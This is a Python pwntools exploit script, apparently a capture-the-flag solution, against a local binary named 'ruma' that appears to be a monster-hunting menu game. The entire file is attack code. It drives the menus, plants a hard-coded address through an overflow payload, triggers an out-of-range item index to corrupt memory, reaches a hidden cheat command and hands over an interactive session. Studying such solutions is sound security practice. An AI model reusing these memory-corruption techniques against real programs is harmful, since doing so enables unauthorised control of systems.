from pwn import *

elf = ELF('./ruma')

r = elf.process()

cmd = 0x804b06c

def spwan(expr, color, name):
	print r.recvuntil('4. buy item\n')
	r.send('1')
	print r.recvuntil('expr: ')
	r.send(str(expr))
	print r.recvuntil('body color: ')
	r.send(color)
	print r.recvuntil('name: ')
	r.send(name)
	print r.recvuntil('is awake!\n')

def hunt():
	print r.recvuntil('4. buy item\n')
	r.send('2')

def change(name):
	print r.recvuntil('4. buy item\n')
	r.send('3')
	print r.recvuntil('name?:')
	r.send(name)

def buy(index):
	print r.recvuntil('4. buy item\n')
	r.send('4')
	print r.recvuntil('3. jook sphere (300 zeny)\n')
	r.send(str(index))

def cheat(command):
	print r.recvuntil('4. buy item\n')
	r.send('1337')
	print r.recvuntil('your command? :')
	r.send(command)

print r.recvuntil('name?:')
r.send('a')

spwan(100000, '134525036', 'CCCCCCCC')
hunt()

for i in range(11):
	buy(1)

cheat('game over man')
cheat('aaaaaaaa' + p32(cmd))
buy(26739)

print r.recv()
r.send('1337')
print r.recv()
r.send('power overwhelming')

r.interactive()
